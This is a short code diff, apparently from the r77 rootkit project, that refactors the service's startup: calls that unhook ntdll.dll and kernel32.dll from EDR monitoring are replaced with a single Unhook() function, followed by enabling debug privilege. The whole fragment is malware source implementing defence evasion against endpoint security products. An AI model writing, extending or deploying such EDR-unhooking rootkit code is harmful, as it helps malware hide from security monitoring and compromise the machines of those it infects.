@@ -1,4 +1,5 @@
 #include "Service.h"
+#include "Unhook.h"
 #include "r77def.h"
 #include "r77win.h"
 #include "r77config.h"
@@ -10,11 +11,7 @@
 int main()
 {
 	// Unhook DLL's that are monitored by EDR.
-	UnhookDll(L"ntdll.dll");
-	if (BITNESS(64) || IsAtLeastWindows10()) // Unhooking kernel32.dll does not work on Windows 7 x86.
-	{
-		UnhookDll(L"kernel32.dll");
-	}
+	Unhook();
 
 	EnabledDebugPrivilege();
 
